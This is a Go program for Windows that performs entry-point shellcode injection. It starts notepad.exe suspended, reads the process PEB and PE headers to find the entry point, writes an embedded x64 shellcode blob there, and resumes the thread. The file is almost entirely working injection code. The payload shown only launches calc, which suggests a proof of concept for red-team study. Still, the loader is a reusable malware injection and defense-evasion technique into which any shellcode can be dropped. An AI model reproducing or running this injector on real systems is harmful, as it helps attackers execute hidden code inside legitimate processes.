package main

import (
	"encoding/binary"
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"syscall"
	"unsafe"
)

type IMAGE_DOS_HEADER struct { // DOS .EXE header
	/*E_magic    uint16     // Magic number
	  E_cblp     uint16     // Bytes on last page of file
	  E_cp       uint16     // Pages in file
	  E_crlc     uint16     // Relocations
	  E_cparhdr  uint16     // Size of header in paragraphs
	  E_minalloc uint16     // Minimum extra paragraphs needed
	  E_maxalloc uint16     // Maximum extra paragraphs needed
	  E_ss       uint16     // Initial (relative) SS value
	  E_sp       uint16     // Initial SP value
	  E_csum     uint16     // Checksum
	  E_ip       uint16     // Initial IP value
	  E_cs       uint16     // Initial (relative) CS value
	  E_lfarlc   uint16     // File address of relocation table
	  E_ovno     uint16     // Overlay number
	  E_res      [4]uint16  // Reserved words
	  E_oemid    uint16     // OEM identifier (for E_oeminfo)
	  E_oeminfo  uint16     // OEM information; E_oemid specific
	  E_res2     [10]uint16 // Reserved words*/
	E_lfanew uint32 // File address of new exe header
}

type IMAGE_NT_HEADER struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

var calc_shellcode []byte = []byte{0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59, 0x48, 0x83, 0xec, 0x28, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x3, 0x57, 0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x1, 0xfe, 0x8b, 0x54, 0x1f, 0x24, 0xf, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x2, 0xad, 0x81, 0x3c, 0x7, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x1, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x1, 0xf7, 0x99, 0xff, 0xd7, 0x48, 0x83, 0xc4, 0x30, 0x5d, 0x5f, 0x5e, 0x5b, 0x5a, 0x59, 0x58, 0xc3}

func main() {
	// Load DLLs
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	ntdll := windows.NewLazyDLL("ntdll.dll")

	// Declare functions that will be used
	ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	ResumeThread := kernel32.NewProc("ResumeThread")
	NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

	var info int32
	var returnLength int32

	var pbi windows.PROCESS_BASIC_INFORMATION
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	/*
	   BOOL CreateProcessA(
	     [in, optional]      LPCSTR                lpApplicationName,
	     [in, out, optional] LPSTR                 lpCommandLine,
	     [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
	     [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
	     [in]                BOOL                  bInheritHandles,
	     [in]                DWORD                 dwCreationFlags,
	     [in, optional]      LPVOID                lpEnvironment,
	     [in, optional]      LPCSTR                lpCurrentDirectory,
	     [in]                LPSTARTUPINFOA        lpStartupInfo,
	     [out]               LPPROCESS_INFORMATION lpProcessInformation
	   );
	*/

	fmt.Println("[*] Calling CreateProcess...")
	err := windows.CreateProcess(
		nil,
		syscall.StringToUTF16Ptr("C:\\Windows\\System32\\notepad.exe"),
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		log.Fatal(err)
	}

	/*
	   __kernel_entry NTSTATUS NtQueryInformationProcess(
	     [in]            HANDLE           ProcessHandle,
	     [in]            PROCESSINFOCLASS ProcessInformationClass,
	     [out]           PVOID            ProcessInformation,
	     [in]            ULONG            ProcessInformationLength,
	     [out, optional] PULONG           ReturnLength
	   );
	*/

	fmt.Println("[*] Calling NtQueryInformationProcess...")
	NtQueryInformationProcess.Call(
		uintptr(pi.Process),
		uintptr(info),
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(windows.PROCESS_BASIC_INFORMATION{})),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	pebOffset := uintptr(unsafe.Pointer(pbi.PebBaseAddress)) + 0x10
	var imageBase uintptr = 0

	/*
	   BOOL ReadProcessMemory(
	     [in]  HANDLE  hProcess,
	     [in]  LPCVOID lpBaseAddress,
	     [out] LPVOID  lpBuffer,
	     [in]  SIZE_T  nSize,
	     [out] SIZE_T  *lpNumberOfBytesRead
	   );
	*/

	fmt.Println("[*] Calling ReadProcessMemory...")
	ReadProcessMemory.Call(
		uintptr(pi.Process),
		pebOffset,
		uintptr(unsafe.Pointer(&imageBase)),
		8,
		0,
	)

	headersBuffer := make([]byte, 4096)

	fmt.Println("[*] Calling ReadProcessMemory...")
	ReadProcessMemory.Call(
		uintptr(pi.Process),
		uintptr(imageBase),
		uintptr(unsafe.Pointer(&headersBuffer[0])),
		4096,
		0,
	)

	fmt.Printf("\n[*] Image Base: 0x%x\n", imageBase)
	fmt.Printf("[*] PEB Offset: 0x%x\n", pebOffset)

	// Parse DOS header e_lfanew entry to calculate entry point address
	var dosHeader IMAGE_DOS_HEADER
	dosHeader.E_lfanew = binary.LittleEndian.Uint32(headersBuffer[60:64])
	ntHeader := (*IMAGE_NT_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(&headersBuffer[0])) + uintptr(dosHeader.E_lfanew)))
	codeEntry := uintptr(ntHeader.OptionalHeader.AddressOfEntryPoint) + imageBase

	/*
	   BOOL WriteProcessMemory(
	     [in]  HANDLE  hProcess,
	     [in]  LPVOID  lpBaseAddress,
	     [in]  LPCVOID lpBuffer,
	     [in]  SIZE_T  nSize,
	     [out] SIZE_T  *lpNumberOfBytesWritten
	   );
	*/

	fmt.Println("\n[*] Calling WriteProcessMemory...")
	WriteProcessMemory.Call(
		uintptr(pi.Process),
		codeEntry, // write shellcode to entry point
		uintptr(unsafe.Pointer(&calc_shellcode[0])),
		uintptr(len(calc_shellcode)),
		0,
	)

	/*
	   DWORD ResumeThread(
	     [in] HANDLE hThread
	   );
	*/

	fmt.Println("[*] Calling ResumeThread...") // finally resume thread
	ResumeThread.Call(uintptr(pi.Thread))

	// shellcode should have been executed at this point
	fmt.Println("[+] Shellcode executed!")
}
